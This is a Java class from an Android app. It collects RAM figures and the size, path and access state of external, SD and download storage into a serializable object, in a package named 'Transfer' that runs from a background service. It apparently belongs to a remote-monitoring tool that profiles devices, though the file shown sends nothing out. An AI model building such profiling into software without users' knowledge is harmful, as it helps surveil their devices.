package Transfer;

import android.app.ActivityManager;
import android.app.ActivityManager.MemoryInfo;
import android.content.Context;
import android.os.Build.VERSION;
import android.os.Environment;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.File;
import java.io.Serializable;

public class Memory implements Serializable {

  public long DOWNLOAD_FREE;
  public long DOWNLOAD_MAX;
  public String DOWNLOAD_PATH;
  public boolean DOWNLOAD_READ;
  public boolean DOWNLOAD_WRITE;
  public long FREERAM;
  public long SD_FREE;
  public long SD_MAX;
  public String SD_PATH;
  public boolean SD_READ;
  public boolean SD_WRITE;
  public long SYSTEM_FREE;
  public long SYSTEM_MAX;
  public String SYSTEM_PATH;
  public boolean SYSTEM_READ;
  public String SYSTEM_STATE;
  public boolean SYSTEM_WRITE;
  public long THRESHOLD;
  public long TOTALRAM;

  public Memory() {
    SYSTEM_MAX = -1;
    SYSTEM_FREE = -1;
    SD_MAX = -1;
    SD_FREE = -1;
    DOWNLOAD_MAX = -1;
    DOWNLOAD_FREE = -1;

    try {
      ActivityManager activityManager =
          (ActivityManager) MyService.context.getSystemService(Context.ACTIVITY_SERVICE);
      MemoryInfo memoryInfo = new MemoryInfo();
      activityManager.getMemoryInfo(memoryInfo);
      if (VERSION.SDK_INT >= 16) {
        TOTALRAM = memoryInfo.totalMem;
      }

      FREERAM = memoryInfo.availMem;
      THRESHOLD = memoryInfo.threshold;

      File externalStorageDirectory = Environment.getExternalStorageDirectory();
      if (VERSION.SDK_INT >= 9) {
        SYSTEM_MAX = externalStorageDirectory.getTotalSpace();
        SYSTEM_FREE = externalStorageDirectory.getFreeSpace();
      }

      SYSTEM_READ = externalStorageDirectory.canRead();
      SYSTEM_WRITE = externalStorageDirectory.canWrite();
      SYSTEM_STATE = Environment.getExternalStorageState();
      SYSTEM_PATH = externalStorageDirectory.getCanonicalPath();

      externalStorageDirectory = new File(System.getenv("SECONDARY_STORAGE"));
      if (VERSION.SDK_INT >= 9) {
        SD_MAX = externalStorageDirectory.getTotalSpace();
        SD_FREE = externalStorageDirectory.getFreeSpace();
      }

      SD_READ = externalStorageDirectory.canRead();
      SD_WRITE = externalStorageDirectory.canWrite();
      SD_PATH = externalStorageDirectory.getCanonicalPath();

      externalStorageDirectory = Environment.getDownloadCacheDirectory();
      if (VERSION.SDK_INT >= 9) {
        DOWNLOAD_MAX = externalStorageDirectory.getTotalSpace();
        DOWNLOAD_FREE = externalStorageDirectory.getFreeSpace();
      }

      DOWNLOAD_READ = externalStorageDirectory.canRead();
      DOWNLOAD_WRITE = externalStorageDirectory.canWrite();
      DOWNLOAD_PATH = externalStorageDirectory.getCanonicalPath();
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
